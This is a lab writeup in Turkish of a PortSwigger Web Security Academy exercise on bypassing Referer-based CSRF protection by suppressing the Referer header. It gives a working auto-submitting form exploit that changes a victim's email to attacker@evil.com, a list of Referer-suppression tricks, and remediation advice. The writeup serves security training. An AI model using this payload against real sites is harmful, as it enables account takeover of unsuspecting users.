# CSRF Where Referer Validation Depends on Header Being Present — Writeup

**Platform:** PortSwigger Web Security Academy
**Tarih:** 2026-11-14

---

## Executive Summary

- **Hedef:** `https://<lab-id>.web-security-academy.net/` (PortSwigger lab)
- **Zorluk:** Orta (Practitioner)
- **Tespit Edilen Zafiyet:** CSRF — savunma Referer header doğrulamasına dayanıyor, ama Referer yoksa doğrulama atlanıyor
- **Genel Etki:** Saldırgan, Referer'ı bastırarak (no-referrer) kontrolü atlayıp kurbanın e-postasını değiştirebilir
- **Durum:** Tamamlandı — no-referrer exploit'i teslim edildi, lab çözüldü

---

## Vulnerability Analysis

- **Savunma:** Uygulama CSRF'e karşı **Referer header**'ını kullanıyor — isteğin kendi domain'inden gelip gelmediğini kontrol ediyor. Token yok.
- **Açık:** Referer **varsa** doğruluyor, ama **yoksa isteği kabul ediyor** (lenient fallback). Yani `if (Referer varsa) doğrula; yoksa geç` mantığı.
- **Sonuç:** Saldırgan Referer'ı **tamamen sildirirse**, kontrol atlanır ve cross-site istek kabul edilir.
- **Kök sebep:** Referer güvenlik için tasarlanmamış bir header; saldırgan onu bastırabiliyor (gizlilik mekanizmaları kötüye kullanılarak).

---

## Exploitation

### Referer'ı bastırma
`<meta name="referrer" content="no-referrer">` → sayfadan giden isteklerde Referer gönderilmez. (Eski eşdeğeri: `content="never"`.)

### Exploit
```html
<meta name="referrer" content="no-referrer">
<form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

Akış:
1. `<meta name="referrer" content="no-referrer">` → exploit sayfasından giden tüm isteklerde Referer **çıkarılır**
2. Form auto-submit → change-email'e POST, **Referer olmadan**
3. Sunucu "Referer yok → doğrulama atla → kabul et" → kurbanın e-postası değişir

### Teslimat
Exploit server → Store → View exploit → Deliver to victim → lab çözüldü.

---

## Remediation

- **Referer'ı tek savunma yapma** — güvenlik için tasarlanmamış, bastırılabilir/değiştirilebilir.
- **"Referer yoksa reddet"** (yoksa kabul etme) — ama bu meşru kullanıcıları da engelleyebilir (gizlilik ayarları).
- **CSRF token** (birincil savunma) + SameSite (ikincil). Referer en fazla ek katman olmalı.

---

## Gotchas (Dikkat Edilecekler)

- **Referer'ın görevi güvenlik değil** — "nereden geldim" bilgisi taşır (analytics/log). Bazı sunucular onu CSRF kontrolüne koşar; bu zayıf ve yeniden-amaçlandırılmış bir kullanım.
- **İki Referer bypass yolu:** (1) Referer'ı **sildir** (no-referrer) → "yoksa kabul et" açığı; (2) Referer'a **hedef domain'i göm** (`evil.com/?hedef.com`) → zayıf string kontrolü. Bu lab birincisiydi.
- **Referer bastırma metodları:** `<meta name="referrer" content="no-referrer">` (ya da legacy `never`), `rel="noreferrer"`, `referrerpolicy` attribute, HTTPS→HTTP downgrade.
- **`never` ≈ `no-referrer`** — eski vs modern anahtar kelime, aynı sonuç.
- Meta tag `<form>`'dan ÖNCE (sayfanın başında) olmalı ki politika istek atılmadan geçerli olsun.
